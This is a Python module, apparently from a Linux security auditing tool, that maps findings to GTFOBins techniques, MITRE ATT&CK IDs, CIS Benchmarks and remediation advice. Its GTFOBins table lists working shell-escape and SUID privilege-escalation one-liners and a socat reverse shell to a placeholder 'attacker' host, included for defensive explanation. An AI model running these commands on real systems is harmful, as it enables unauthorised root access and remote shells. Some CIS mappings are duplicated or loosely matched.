"""Knowledge base and enrichment engine for VINA findings.

Provides structured rules, GTFOBins mappings, MITRE ATT&CK references,
and CIS Benchmark mappings for automatic finding enrichment.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

from ..models.findings import Finding

# =========================================================================
#  GTFOBins mapping
# =========================================================================

GTFOBINS_BINARIES: dict[str, dict[str, str]] = {
    "find": {
        "url": "https://gtfobins.github.io/gtfobins/find/",
        "technique": "find . -exec /bin/sh -p \\; -quit",
        "description": "Can execute arbitrary commands via -exec or -ok, bypassing restricted shells.",
    },
    "bash": {
        "url": "https://gtfobins.github.io/gtfobins/bash/",
        "technique": "bash -p or /bin/bash -p",
        "description": "Can spawn a privileged shell when SUID or capabilities are set.",
    },
    "sh": {
        "url": "https://gtfobins.github.io/gtfobins/sh/",
        "technique": "sh -p or /bin/sh -p",
        "description": "Can spawn a privileged shell when SUID or capabilities are set.",
    },
    "dash": {
        "url": "https://gtfobins.github.io/gtfobins/dash/",
        "technique": "dash -p or /bin/dash -p",
        "description": "Can spawn a privileged shell when SUID or capabilities are set.",
    },
    "tar": {
        "url": "https://gtfobins.github.io/gtfobins/tar/",
        "technique": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "description": "Can execute arbitrary commands via checkpoint-action or -I flag.",
    },
    "python3": {
        "url": "https://gtfobins.github.io/gtfobins/python/",
        "technique": "python3 -c 'import os; os.system(\"/bin/sh\")'",
        "description": "Can execute arbitrary commands and spawn shells via os.system, subprocess, or ctypes.",
    },
    "python": {
        "url": "https://gtfobins.github.io/gtfobins/python/",
        "technique": "python -c 'import os; os.system(\"/bin/sh\")'",
        "description": "Can execute arbitrary commands and spawn shells via os.system, subprocess, or ctypes.",
    },
    "perl": {
        "url": "https://gtfobins.github.io/gtfobins/perl/",
        "technique": "perl -e 'exec \"/bin/sh\";'",
        "description": "Can execute arbitrary commands and spawn shells via exec, system, or backticks.",
    },
    "nmap": {
        "url": "https://gtfobins.github.io/gtfobins/nmap/",
        "technique": "nmap --interactive or nmap --script=+\\\"os.execute('/bin/sh')\\\"",
        "description": "Can execute arbitrary commands via --interactive mode or NSE scripts.",
    },
    "vim": {
        "url": "https://gtfobins.github.io/gtfobins/vim/",
        "technique": "vim -c ':!/bin/sh'",
        "description": "Can spawn a shell via :! command within the editor.",
    },
    "less": {
        "url": "https://gtfobins.github.io/gtfobins/less/",
        "technique": "less /etc/passwd followed by !/bin/sh",
        "description": "Can execute commands via ! command within pager.",
    },
    "more": {
        "url": "https://gtfobins.github.io/gtfobins/more/",
        "technique": "more /etc/passwd followed by !/bin/sh",
        "description": "Can execute commands via ! command within pager.",
    },
    "awk": {
        "url": "https://gtfobins.github.io/gtfobins/awk/",
        "technique": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "description": "Can execute arbitrary commands via system() function.",
    },
    "openssl": {
        "url": "https://gtfobins.github.io/gtfobins/openssl/",
        "technique": "openssl req -engine /bin/sh",
        "description": "Can execute arbitrary commands via -engine flag when SUID.",
    },
    "git": {
        "url": "https://gtfobins.github.io/gtfobins/git/",
        "technique": "git -p help followed by !/bin/sh",
        "description": "Can spawn a shell via pager or hooks with SUID.",
    },
    "cp": {
        "url": "https://gtfobins.github.io/gtfobins/cp/",
        "technique": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh",
        "description": "Can copy and set SUID on files when running with elevated privileges.",
    },
    "mv": {
        "url": "https://gtfobins.github.io/gtfobins/mv/",
        "technique": "Use to overwrite restricted files (e.g., /etc/passwd)",
        "description": "Can overwrite arbitrary files by moving a writable file over them.",
    },
    "chmod": {
        "url": "https://gtfobins.github.io/gtfobins/chmod/",
        "technique": "chmod u+s /bin/sh",
        "description": "Can add SUID bit to binaries when running with elevated privileges.",
    },
    "socat": {
        "url": "https://gtfobins.github.io/gtfobins/socat/",
        "technique": "socat exec:'/bin/sh',pty,stderr TCP:attacker:4444",
        "description": "Can create reverse shells or bind shells via exec.",
    },
}


def _get_gtfo_bins_from_path(path: str) -> list[dict[str, str]]:
    """Look up GTFOBins entries for a given binary path."""
    if not path:
        return []
    binary = path.split("/")[-1].lower()
    entry = GTFOBINS_BINARIES.get(binary)
    if entry:
        return [{"binary": binary, **entry}]
    return []


def _get_gtfo_bins_from_cmd(cmd: str) -> list[dict[str, str]]:
    """Look up GTFOBins entries from a command string."""
    if not cmd:
        return []
    parts = cmd.split()
    if not parts:
        return []
    raw = parts[0]
    return _get_gtfo_bins_from_path(raw)


# =========================================================================
#  MITRE ATT&CK constants
# =========================================================================


class MitreTechnique:
    """Common MITRE ATT&CK technique IDs and names."""

    T1078 = "T1078 - Valid Accounts"
    T1098 = "T1098 - Account Manipulation"
    T1136 = "T1136 - Create Account"
    T1548_001 = "T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid"
    T1548_002 = "T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control"
    T1548_003 = "T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
    T1546_008 = "T1546.008 - Event Triggered Execution: Accessibility Features"
    T1053_003 = "T1053.003 - Scheduled Task/Job: Cron"
    T1053_005 = "T1053.005 - Scheduled Task/Job: Systemd Timers"
    T1055_001 = "T1055.001 - Process Injection: DLL Injection"
    T1068 = "T1068 - Exploitation for Privilege Escalation"
    T1070_004 = "T1070.004 - Indicator Removal: File Deletion"
    T1082 = "T1082 - System Information Discovery"
    T1083 = "T1083 - File and Directory Discovery"
    T1087 = "T1087 - Account Discovery"
    T1003 = "T1003 - OS Credential Dumping"
    T1003_001 = "T1003.001 - OS Credential Dumping: LSASS Memory"
    T1003_008 = "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow"
    T1110 = "T1110 - Brute Force"
    T1110_001 = "T1110.001 - Brute Force: Password Guessing"
    T1110_002 = "T1110.002 - Brute Force: Password Cracking"
    T1135 = "T1135 - Network Share Discovery"
    T1204_002 = "T1204.002 - User Execution: Malicious File"
    T1552_001 = "T1552.001 - Unsecured Credentials: Credentials In Files"
    T1552_002 = "T1552.002 - Unsecured Credentials: Credentials in Registry"
    T1552_004 = "T1552.004 - Unsecured Credentials: Private Keys"
    T1552_006 = "T1552.006 - Unsecured Credentials: Group Policy Preferences"
    T1555_003 = "T1555.003 - Credentials from Password Stores: Web Browser Credentials"
    T1562_001 = "T1562.001 - Impair Defenses: Disable or Modify Tools"
    T1562_004 = "T1562.004 - Impair Defenses: Disable or Modify System Firewall"
    T1563_001 = "T1563.001 - Remote Service Session Hijacking: SSH Hijacking"
    T1569_002 = "T1569.002 - System Services: Service Execution"
    T1574_001 = "T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking"
    T1574_002 = "T1574.002 - Hijack Execution Flow: DLL Side-Loading"
    T1542 = "T1542 - Boot or Logon Autostart Execution"
    T1611 = "T1611 - Escape to Host"
    T1059_004 = "T1059.004 - Command and Scripting Interpreter: Unix Shell"
    T1059_006 = "T1059.006 - Command and Scripting Interpreter: Python"
    T1059_007 = "T1059.007 - Command and Scripting Interpreter: Perl"
    T1059_002 = "T1059.002 - Command and Scripting Interpreter: AppleScript"
    T1202 = "T1202 - Indirect Command Execution"
    T1070 = "T1070 - Indicator Removal"
    T1021_004 = "T1021.004 - Remote Services: SSH"
    T1036 = "T1036 - Masquerading"
    T1036_003 = "T1036.003 - Masquerading: Rename System Utilities"
    T1098_001 = "T1098.001 - Account Manipulation: Additional Cloud Roles"
    T1136_001 = "T1136.001 - Create Account: Local Account"
    T1484 = "T1484 - Domain Policy Modification"
    T1525 = "T1525 - Implant Internal Image"
    T1552 = "T1552 - Unsecured Credentials"
    T1556 = "T1556 - Modify Authentication Process"
    T1556_003 = "T1556.003 - Modify Authentication Process: Pluggable Authentication Modules"
    T1557 = "T1557 - Adversary-in-the-Middle"
    T1090 = "T1090 - Proxy"


# =========================================================================
#  CIS Benchmark constants
# =========================================================================


class CisControl:
    """Common CIS Control references."""

    v8_01 = "CIS Control 1: Inventory and Control of Enterprise Assets"
    v8_02 = "CIS Control 2: Inventory and Control of Software Assets"
    v8_03 = "CIS Control 3: Data Protection"
    v8_04 = "CIS Control 4: Secure Configuration of Enterprise Assets and Software"
    v8_05 = "CIS Control 5: Account Management"
    v8_06 = "CIS Control 6: Access Control Management"
    v8_07 = "CIS Control 7: Continuous Vulnerability Management"
    v8_08 = "CIS Control 8: Audit Log Management"
    v8_09 = "CIS Control 9: Email and Web Browser Protections"
    v8_10 = "CIS Control 10: Malware Defenses"
    v8_11 = "CIS Control 11: Data Recovery"
    v8_12 = "CIS Control 12: Network Infrastructure Management"
    v8_13 = "CIS Control 13: Network Monitoring and Defense"
    v8_14 = "CIS Control 14: Security Awareness and Skills Training"
    v8_15 = "CIS Control 15: Service Provider Management"
    v8_16 = "CIS Control 16: Application Software Security"
    v8_17 = "CIS Control 17: Incident Response Management"
    v8_18 = "CIS Control 18: Penetration Testing"

    # CIS Distribution-specific benchmark references
    # Ubuntu / Debian Linux Benchmark
    ubuntu_1_1_1_1 = "CIS Ubuntu Benchmark 1.1.1.1 - Ensure mounting of cramfs modules is disabled"
    ubuntu_1_1_1_2 = "CIS Ubuntu Benchmark 1.1.1.2 - Ensure mounting of freevxfs modules is disabled"
    ubuntu_3_1_1 = "CIS Ubuntu Benchmark 3.1.1 - Ensure packet redirect sending is disabled"
    ubuntu_3_2_1 = "CIS Ubuntu Benchmark 3.2.1 - Ensure source routed packets are not accepted"
    ubuntu_3_2_2 = "CIS Ubuntu Benchmark 3.2.2 - Ensure ICMP redirects are not accepted"
    ubuntu_3_2_3 = "CIS Ubuntu Benchmark 3.2.3 - Ensure secure ICMP redirects are not accepted"
    ubuntu_3_2_4 = "CIS Ubuntu Benchmark 3.2.4 - Ensure suspicious packets are logged"
    ubuntu_3_2_5 = "CIS Ubuntu Benchmark 3.2.5 - Ensure broadcast ICMP requests are ignored"
    ubuntu_3_2_6 = "CIS Ubuntu Benchmark 3.2.6 - Ensure bogus ICMP responses are ignored"
    ubuntu_3_2_7 = "CIS Ubuntu Benchmark 3.2.7 - Ensure Reverse Path Filtering is enabled"
    ubuntu_3_2_8 = "CIS Ubuntu Benchmark 3.2.8 - Ensure TCP SYN Cookies is enabled"
    ubuntu_3_3_1 = "CIS Ubuntu Benchmark 3.3.1 - Ensure IPv6 router advertisements are not accepted"
    ubuntu_3_3_2 = "CIS Ubuntu Benchmark 3.3.2 - Ensure IPv6 redirects are not accepted"
    ubuntu_3_3_3 = "CIS Ubuntu Benchmark 3.3.3 - Ensure IPv6 is disabled"
    ubuntu_4_1_1_1 = "CIS Ubuntu Benchmark 4.1.1.1 - Ensure auditd is installed"
    ubuntu_4_1_1_2 = "CIS Ubuntu Benchmark 4.1.1.2 - Ensure auditd service is enabled"
    ubuntu_4_1_2_1 = "CIS Ubuntu Benchmark 4.1.2.1 - Ensure audit log storage size is configured"
    ubuntu_4_2_1_1 = "CIS Ubuntu Benchmark 4.2.1.1 - Ensure rsyslog is installed"
    ubuntu_4_2_1_2 = "CIS Ubuntu Benchmark 4.2.1.2 - Ensure rsyslog Service is enabled"
    ubuntu_5_1_1 = "CIS Ubuntu Benchmark 5.1.1 - Ensure cron daemon is enabled and running"
    ubuntu_5_2_1 = "CIS Ubuntu Benchmark 5.2.1 - Ensure sudo is installed"
    ubuntu_5_2_2 = "CIS Ubuntu Benchmark 5.2.2 - Ensure sudo commands use pty"
    ubuntu_5_2_3 = "CIS Ubuntu Benchmark 5.2.3 - Ensure sudo log file exists"
    ubuntu_5_2_4 = "CIS Ubuntu Benchmark 5.2.4 - Ensure sudo authentication timeout is configured"
    ubuntu_5_3_1 = "CIS Ubuntu Benchmark 5.3.1 - Ensure permissions on /etc/ssh/sshd_config are configured"
    ubuntu_5_3_2 = "CIS Ubuntu Benchmark 5.3.2 - Ensure permissions on SSH private host key files are configured"
    ubuntu_5_3_3 = "CIS Ubuntu Benchmark 5.3.3 - Ensure permissions on SSH public host key files are configured"
    ubuntu_5_3_4 = "CIS Ubuntu Benchmark 5.3.4 - Ensure SSH LogLevel is appropriate"
    ubuntu_5_3_5 = "CIS Ubuntu Benchmark 5.3.5 - Ensure SSH X11 forwarding is disabled"
    ubuntu_5_3_6 = "CIS Ubuntu Benchmark 5.3.6 - Ensure SSH MaxAuthTries is 6 or less"
    ubuntu_5_3_7 = "CIS Ubuntu Benchmark 5.3.7 - Ensure SSH IgnoreRhosts is enabled"
    ubuntu_5_3_8 = "CIS Ubuntu Benchmark 5.3.8 - Ensure SSH HostbasedAuthentication is disabled"
    ubuntu_5_3_9 = "CIS Ubuntu Benchmark 5.3.9 - Ensure SSH root login is disabled"
    ubuntu_5_3_10 = "CIS Ubuntu Benchmark 5.3.10 - Ensure SSH PermitEmptyPasswords is disabled"
    ubuntu_5_3_11 = "CIS Ubuntu Benchmark 5.3.11 - Ensure SSH PermitUserEnvironment is disabled"
    ubuntu_5_3_12 = "CIS Ubuntu Benchmark 5.3.12 - Ensure only strong Ciphers are used"
    ubuntu_5_3_13 = "CIS Ubuntu Benchmark 5.3.13 - Ensure only strong MAC algorithms are used"
    ubuntu_5_3_14 = "CIS Ubuntu Benchmark 5.3.14 - Ensure only strong Key Exchange algorithms are used"
    ubuntu_5_3_15 = "CIS Ubuntu Benchmark 5.3.15 - Ensure SSH Idle Timeout Interval is configured"
    ubuntu_5_3_16 = "CIS Ubuntu Benchmark 5.3.16 - Ensure SSH LoginGraceTime is set to one minute or less"
    ubuntu_5_3_17 = "CIS Ubuntu Benchmark 5.3.17 - Ensure SSH access is limited"
    ubuntu_5_3_18 = "CIS Ubuntu Benchmark 5.3.18 - Ensure SSH warning banner is configured"
    ubuntu_5_4_1_1 = "CIS Ubuntu Benchmark 5.4.1.1 - Ensure password creation requirements are configured"
    ubuntu_5_4_1_2 = "CIS Ubuntu Benchmark 5.4.1.2 - Ensure lockout for failed password attempts is configured"
    ubuntu_5_4_1_3 = "CIS Ubuntu Benchmark 5.4.1.3 - Ensure password hashing algorithm is up to date"
    ubuntu_5_4_1_4 = "CIS Ubuntu Benchmark 5.4.1.4 - Ensure password reuse is limited"
    ubuntu_5_4_2_1 = "CIS Ubuntu Benchmark 5.4.2.1 - Ensure account is locked after 35 days of inactivity"
    ubuntu_5_4_2_2 = "CIS Ubuntu Benchmark 5.4.2.2 - Ensure system accounts are non-login"
    ubuntu_5_4_3 = "CIS Ubuntu Benchmark 5.4.3 - Ensure default group for root is GID 0"
    ubuntu_5_4_4 = "CIS Ubuntu Benchmark 5.4.4 - Ensure default user umask is 027 or more restrictive"
    ubuntu_5_4_5 = "CIS Ubuntu Benchmark 5.4.5 - Ensure default user shell is restricted"
    ubuntu_6_1_1 = "CIS Ubuntu Benchmark 6.1.1 - Ensure permissions on /etc/passwd are configured"
    ubuntu_6_1_2 = "CIS Ubuntu Benchmark 6.1.2 - Ensure permissions on /etc/passwd- are configured"
    ubuntu_6_1_3 = "CIS Ubuntu Benchmark 6.1.3 - Ensure permissions on /etc/shadow are configured"
    ubuntu_6_1_4 = "CIS Ubuntu Benchmark 6.1.4 - Ensure permissions on /etc/shadow- are configured"
    ubuntu_6_1_5 = "CIS Ubuntu Benchmark 6.1.5 - Ensure permissions on /etc/group are configured"
    ubuntu_6_1_6 = "CIS Ubuntu Benchmark 6.1.6 - Ensure permissions on /etc/group- are configured"
    ubuntu_6_1_7 = "CIS Ubuntu Benchmark 6.1.7 - Ensure permissions on /etc/gshadow are configured"
    ubuntu_6_1_8 = "CIS Ubuntu Benchmark 6.1.8 - Ensure permissions on /etc/gshadow- are configured"
    ubuntu_6_1_9 = "CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist"
    ubuntu_6_1_10 = "CIS Ubuntu Benchmark 6.1.10 - Ensure no unowned files or directories exist"
    ubuntu_6_1_11 = "CIS Ubuntu Benchmark 6.1.11 - Ensure no ungrouped files or directories exist"
    ubuntu_6_2_1 = "CIS Ubuntu Benchmark 6.2.1 - Ensure password fields are not empty"
    ubuntu_6_2_2 = "CIS Ubuntu Benchmark 6.2.2 - Ensure all groups in /etc/passwd exist in /etc/group"
    ubuntu_6_2_3 = "CIS Ubuntu Benchmark 6.2.3 - Ensure no duplicate UIDs exist"
    ubuntu_6_2_4 = "CIS Ubuntu Benchmark 6.2.4 - Ensure no duplicate GIDs exist"
    ubuntu_6_2_5 = "CIS Ubuntu Benchmark 6.2.5 - Ensure no duplicate user names exist"
    ubuntu_6_2_6 = "CIS Ubuntu Benchmark 6.2.6 - Ensure no duplicate group names exist"
    ubuntu_6_2_7 = "CIS Ubuntu Benchmark 6.2.7 - Ensure root is the only UID 0 account"
    ubuntu_6_2_8 = "CIS Ubuntu Benchmark 6.2.8 - Ensure root PATH Integrity"

    # Authentication & Password Policy
    ubuntu_5_4_1_1 = "CIS Ubuntu Benchmark 5.4.1.1 - Ensure password creation requirements are configured"
    ubuntu_5_4_1_2 = "CIS Ubuntu Benchmark 5.4.1.2 - Ensure lockout for failed password attempts is configured"
    ubuntu_5_4_1_3 = "CIS Ubuntu Benchmark 5.4.1.3 - Ensure password hashing algorithm is up to date"
    ubuntu_5_4_1_4 = "CIS Ubuntu Benchmark 5.4.1.4 - Ensure password reuse is limited"
    ubuntu_5_4_2_1 = "CIS Ubuntu Benchmark 5.4.2.1 - Ensure account is locked after 35 days of inactivity"
    ubuntu_5_4_2_2 = "CIS Ubuntu Benchmark 5.4.2.2 - Ensure system accounts are non-login"

    # Session & Access
    ubuntu_5_5_1_1 = "CIS Ubuntu Benchmark 5.5.1.1 - Ensure minimum days between password changes is configured"
    ubuntu_5_5_1_2 = "CIS Ubuntu Benchmark 5.5.1.2 - Ensure password expiration is 365 days or less"
    ubuntu_5_5_1_3 = "CIS Ubuntu Benchmark 5.5.1.3 - Ensure password expiration warning days is 7 or more"
    ubuntu_5_5_1_4 = "CIS Ubuntu Benchmark 5.5.1.4 - Ensure inactive password lock is 30 days or less"

    # Polkit
    ubuntu_5_7_1 = "CIS Ubuntu Benchmark 5.7.1 - Ensure PolicyKit is installed and configured"
    ubuntu_5_7_2 = "CIS Ubuntu Benchmark 5.7.2 - Ensure PolicyKit rules are secure"


# =========================================================================
#  Knowledge rules
# =========================================================================


@dataclass(slots=True)
class KnowledgeRule:
    """A structured knowledge-base rule for enriching findings.

    Rules are matched against findings by checking whether any of the
    ``title_patterns`` appear (case-insensitive) in the finding title.
    """

    rule_id: str
    title_patterns: list[str]
    explanation: str
    security_impact: str
    remediation: str
    references: list[str] = field(default_factory=list)
    cis_control: str = ""
    mitre_attack: list[str] = field(default_factory=list)
    cwe: str = ""
    tags: list[str] = field(default_factory=list)
    confidence_score: float = 0.8
    source_stages: list[str] | None = None
    source_categories: list[str] | None = None


# ------------------------------------------------------------------
#  OS / Privilege escalation rules
# ------------------------------------------------------------------

PRIVILEGE_ESCALATION_RULES = [
    KnowledgeRule(
        rule_id="PE-001",
        title_patterns=["NOPASSWD sudo: ALL commands"],
        explanation="A user can execute ALL commands via sudo without providing a password. "
        "This grants unrestricted root access to anyone who has access to that user account.",
        security_impact="Critical - Complete system compromise. Any process or user with access "
        "to this account can gain immediate root access without authentication.",
        remediation="Remove the NOPASSWD tag from the sudoers ALL entry. "
        "Use: sudo visudo and change the rule to require password authentication. "
        "Better: grant only specific commands rather than ALL.",
        cis_control="CIS Ubuntu Benchmark 5.2.1 - Ensure sudo is installed",
        mitre_attack=[MitreTechnique.T1548_003],
        cwe="CWE-276: Incorrect Default Permissions",
        tags=["sudo", "privilege-escalation", "authentication"],
        confidence_score=0.95,
    ),
    KnowledgeRule(
        rule_id="PE-002",
        title_patterns=["NOPASSWD sudo: specific commands"],
        explanation="A user can execute specific commands via sudo without a password. "
        "Many common commands (vim, less, tar, find, python, perl) allow shell escape "
        "which would grant root access despite being restricted to specific commands.",
        security_impact="High - Likely privilege escalation. Commands like vim, less, find, "
        "tar, python, and perl all have known shell-escape techniques that bypass restrictions.",
        remediation="Review each NOPASSWD command for shell-escape potential. "
        "Add password requirement unless absolutely necessary. "
        "Consider using 'sudo -l' to audit current rules.",
        cis_control="CIS Ubuntu Benchmark 5.2.1 - Ensure sudo is installed",
        mitre_attack=[MitreTechnique.T1548_003],
        cwe="CWE-276: Incorrect Default Permissions",
        tags=["sudo", "privilege-escalation", "nopasswd"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="PE-003",
        title_patterns=["Password sudo: ALL commands"],
        explanation="A user can execute ALL commands via sudo with password authentication. "
        "While better than passwordless, this still means anyone who knows the user's password "
        "has unrestricted root access.",
        security_impact="High - Full root access for anyone with the user's password. "
        "Also exploitable if the password is weak, reused, or compromised.",
        remediation="Restrict sudo to only the specific commands needed. "
        "Remove the ALL wildcard and grant individual commands.",
        cis_control="CIS Ubuntu Benchmark 5.2.1 - Ensure sudo is installed",
        mitre_attack=[MitreTechnique.T1548_003],
        cwe="CWE-276: Incorrect Default Permissions",
        tags=["sudo", "privilege-escalation", "all"],
        confidence_score=0.75,
    ),
    KnowledgeRule(
        rule_id="PE-004",
        title_patterns=["SUID binary"],
        explanation="A binary with the SUID bit set runs with the permissions of its owner "
        "(typically root), regardless of who executes it. This is a common privilege escalation vector.",
        security_impact="High to Medium - Depending on the binary. Well-known SUID binaries "
        "like pkexec, sudo, and mount have known escalation paths.",
        remediation="Remove the SUID bit if not required: chmod u-s <path>. "
        "For binaries that genuinely need SUID, ensure they are regularly patched "
        "and monitored for CVEs.",
        references=["https://gtfobins.github.io/"],
        cis_control="CIS Ubuntu Benchmark 6.1.9 - Ensure no world writable files exist",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["suid", "privilege-escalation", "binary"],
        confidence_score=0.8,
    ),
]

# ------------------------------------------------------------------
#  Capability rules
# ------------------------------------------------------------------

CAPABILITY_RULES = [
    KnowledgeRule(
        rule_id="CAP-001",
        title_patterns=["Capability:"],
        explanation="File capabilities grant specific root-level privileges to binaries "
        "without full SUID. Capabilities like cap_setuid, cap_dac_override, "
        "and cap_sys_admin can be used for privilege escalation.",
        security_impact="High - Capabilities like cap_setuid+ep effectively grant root access. "
        "cap_dac_override bypasses all file permission checks.",
        remediation="Review each capability assignment. Remove unnecessary capabilities: "
        "setcap -r <path>. Use the principle of least privilege.",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1548_001],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["capabilities", "privilege-escalation", "linux-capabilities"],
        confidence_score=0.8,
    ),
]

# ------------------------------------------------------------------
#  SSH configuration rules
# ------------------------------------------------------------------

SSH_RULES = [
    KnowledgeRule(
        rule_id="SSH-001",
        title_patterns=["SSH root login is permitted"],
        explanation="SSH allows direct root login. This bypasses audit trails since "
        "root actions are not attributed to specific users, and it exposes "
        "the most privileged account to the network.",
        security_impact="High - Direct root SSH access means attackers only need "
        "the root password (or key) to gain full control. Brute force attempts "
        "on root are common.",
        remediation="Set 'PermitRootLogin no' (or 'prohibit-password') in /etc/ssh/sshd_config. "
        "Use sudo for privilege escalation instead.",
        cis_control="CIS Ubuntu Benchmark 5.3.9 - Ensure SSH root login is disabled",
        mitre_attack=[MitreTechnique.T1021_004, MitreTechnique.T1078],
        cwe="CWE-287: Improper Authentication",
        tags=["ssh", "authentication", "root"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="SSH-002",
        title_patterns=["SSH password authentication is enabled"],
        explanation="SSH password authentication allows login with username and password. "
        "This is susceptible to brute-force attacks and credential stuffing.",
        security_impact="Medium - Password authentication increases the attack surface. "
        "Standard mitigation: use SSH keys only (public key authentication).",
        remediation="Set 'PasswordAuthentication no' in /etc/ssh/sshd_config. "
        "Ensure all users have SSH key pairs configured before disabling passwords.",
        cis_control="CIS Ubuntu Benchmark 5.3.10 - Ensure SSH PermitEmptyPasswords is disabled",
        mitre_attack=[MitreTechnique.T1110, MitreTechnique.T1021_004],
        cwe="CWE-308: Use of Single-factor Authentication",
        tags=["ssh", "authentication", "password"],
        confidence_score=0.85,
    ),
    KnowledgeRule(
        rule_id="SSH-003",
        title_patterns=["SSH password authentication is disabled"],
        explanation="Password authentication is disabled for SSH, which is a security best practice. "
        "Only key-based authentication is allowed.",
        security_impact="Info - This is a positive finding. SSH key-only authentication "
        "reduces the attack surface against credential brute-forcing.",
        remediation="Maintain this configuration. Ensure SSH keys are properly managed and rotated.",
        cis_control="CIS Ubuntu Benchmark 5.3.10 - Ensure SSH PermitEmptyPasswords is disabled",
        mitre_attack=[MitreTechnique.T1021_004],
        cwe="",
        tags=["ssh", "authentication", "secure"],
        confidence_score=0.5,
    ),
    KnowledgeRule(
        rule_id="SSH-004",
        title_patterns=["SSH public key authentication is enabled"],
        explanation="Public key authentication is enabled for SSH, allowing key-based login. "
        "This is more secure than password authentication when keys are properly protected.",
        security_impact="Info - Positive finding. Key-based auth is recommended over passwords.",
        remediation="Ensure keys are protected with strong passphrases and stored securely.",
        cis_control="CIS Ubuntu Benchmark 5.3.10 - Ensure SSH PermitEmptyPasswords is disabled",
        tags=["ssh", "authentication", "public-key"],
        confidence_score=0.5,
    ),
]

# ------------------------------------------------------------------
#  Docker rules
# ------------------------------------------------------------------

DOCKER_RULES = [
    KnowledgeRule(
        rule_id="DOCKER-001",
        title_patterns=["Docker socket is world-writable"],
        explanation="The Docker socket (/var/run/docker.sock) is world-writable, "
        "allowing any user on the system to execute Docker commands. "
        "Since Docker runs as root, this is equivalent to full root access.",
        security_impact="Critical - Complete root compromise. Any user can create "
        "a privileged container with host filesystem access.",
        remediation="chmod 660 /var/run/docker.sock && chown root:docker /var/run/docker.sock. "
        "Only the root user and docker group should have access.",
        cis_control="CIS Control 6: Access Control Management",
        mitre_attack=[MitreTechnique.T1611],
        cwe="CWE-732: Incorrect Permission Assignment for Critical Resource",
        tags=["docker", "container", "privilege-escalation", "socket"],
        confidence_score=0.95,
    ),
    KnowledgeRule(
        rule_id="DOCKER-002",
        title_patterns=["Users in docker group"],
        explanation="Users in the docker group can execute Docker commands, which effectively "
        "grants root-level access. Docker access can be used to mount the host filesystem "
        "and execute commands as root.",
        security_impact="High - Docker group membership is equivalent to root access. "
        "Members can create containers with --privileged and -v /:/host.",
        remediation="Remove users from the docker group unless absolutely necessary. "
        "Use: gpasswd -d <user> docker. Review if sudo-based Docker access is sufficient.",
        cis_control="CIS Control 5: Account Management",
        mitre_attack=[MitreTechnique.T1611],
        cwe="CWE-276: Incorrect Default Permissions",
        tags=["docker", "group", "privilege-escalation"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="DOCKER-003",
        title_patterns=["Privileged container:"],
        explanation="A container is running in privileged mode, which removes all container "
        "isolation features. The container has full access to the host system, "
        "including all devices and kernel capabilities.",
        security_impact="High - A compromised privileged container means full host compromise. "
        "Privileged containers can access host devices, mount filesystems, and load kernel modules.",
        remediation="Avoid --privileged flag. Use specific --cap-add and --device flags "
        "to grant only the capabilities actually needed.",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1611],
        cwe="CWE-250: Execution with Unnecessary Privileges",
        tags=["docker", "container", "privileged", "privilege-escalation"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="DOCKER-004",
        title_patterns=["Docker is installed"],
        explanation="Docker is installed on the system. This is informational - "
        "Docker itself is not a vulnerability, but its presence expands the attack surface.",
        security_impact="Info - Docker provides additional attack surface through "
        "containers, images, and the Docker API.",
        remediation="Ensure Docker is kept up to date. Restrict access to the docker group. "
        "Enable Docker Content Trust and use signed images.",
        tags=["docker", "container", "service"],
        confidence_score=0.3,
    ),
]

# ------------------------------------------------------------------
#  Kernel and sysctl rules
# ------------------------------------------------------------------

KERNEL_RULES = [
    KnowledgeRule(
        rule_id="KERNEL-001",
        title_patterns=["ASLR is disabled"],
        explanation="ASLR (Address Space Layout Randomization) randomizes memory addresses "
        "to prevent exploitation of memory corruption vulnerabilities. "
        "When disabled, attackers can predict memory layouts and exploit buffer overflows more easily.",
        security_impact="High - Significantly increases exploit success rate. "
        "Bypasses ASLR-based protection for stack, heap, and library addresses.",
        remediation="Enable ASLR: sysctl -w kernel.randomize_va_space=2. "
        "Persist by adding 'kernel.randomize_va_space = 2' to /etc/sysctl.conf or /etc/sysctl.d/",
        cis_control="CIS Ubuntu Benchmark 1.5.1 - Ensure address space layout randomization (ASLR) is enabled",
        mitre_attack=[MitreTechnique.T1068],
        cwe="CWE-754: Improper Check for Unusual or Exceptional Conditions",
        tags=["aslr", "kernel", "exploit-mitigation"],
        confidence_score=0.9,
    ),
    KnowledgeRule(
        rule_id="KERNEL-002",
        title_patterns=["ASLR is enabled"],
        explanation="ASLR is enabled with full randomization (randomize_va_space=2). "
        "This is a security best practice that makes memory corruption exploits more difficult.",
        security_impact="Info - Positive finding. ASLR helps protect against buffer overflow and ROP exploits.",
        remediation="Maintain this configuration. Verify it persists across reboots.",
        tags=["aslr", "kernel", "exploit-mitigation"],
        confidence_score=0.5,
    ),
    KnowledgeRule(
        rule_id="KERNEL-003",
        title_patterns=["expected"],
        explanation="A kernel sysctl parameter is set to a non-recommended value, "
        "reducing the system's security posture.",
        security_impact="Medium - Depending on the specific sysctl. IP forwarding, "
        "accepting redirects, or disabled reverse-path filtering can enable "
        "network-based attacks.",
        remediation="Set the sysctl to the recommended value: "
        "sysctl -w <key>=<expected>. Add the setting to /etc/sysctl.d/ for persistence.",
        cis_control="CIS Control 4: Secure Configuration of Enterprise Assets and Software",
        mitre_attack=[MitreTechnique.T1562_001],
        cwe="CWE-754: Improper Check for Unusual or Exceptional Conditions",
